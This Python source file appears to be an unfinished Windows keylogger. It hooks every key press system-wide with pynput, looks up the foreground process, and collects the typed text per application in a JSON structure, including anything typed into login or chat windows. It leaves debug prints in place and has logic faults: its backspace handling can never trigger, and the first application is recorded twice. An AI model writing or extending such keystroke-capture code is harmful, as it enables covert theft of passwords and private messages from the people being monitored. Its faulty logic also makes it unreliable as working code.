import psutil
import win32gui
import win32process
import json
import os
from pynput import keyboard

JSONFile = json.loads('{"apps":[]}')


def keyPressed(key):
    global JSONFile
    # the pressed key in string form
    strKey = str(key)
    file = JSONFile

    # Getting the process name
    hwnd = win32gui.GetForegroundWindow()
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    process = psutil.Process(pid)
    check = 0

    # Changing the caught string according to the protocol
    if 'Key' not in strKey:
        strKey = strKey[1:-1]

    elif strKey == "Key.enter":
        strKey = "\n"

    elif strKey == "Key.space":
        strKey = " "

    else:
        strKey = ""

    # Looping through the JSON file to check if the app is already there and changing the text
    for app in file["apps"]:
        if str(app["appName"]) == process.name():
            if strKey == "Key.backspace":
                app["text"] = str(app["text"])[:-1]
            else:
                app["text"] = str(app["text"]) + strKey
            check = 1

    # If the app is not yet in the file add it
    if check == 0:
        file["apps"].append(dict(appName=process.name(), text=strKey))

    # Adding the first app
    if JSONFile == json.loads('{"apps":[]}'):
        print("here")
        file["apps"].append(dict(appName=process.name(), text=strKey))

    JSONFile = file
    if strKey == "o":
        process1 = psutil.Process(os.getpid())
        print(process1.memory_info().rss)



if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
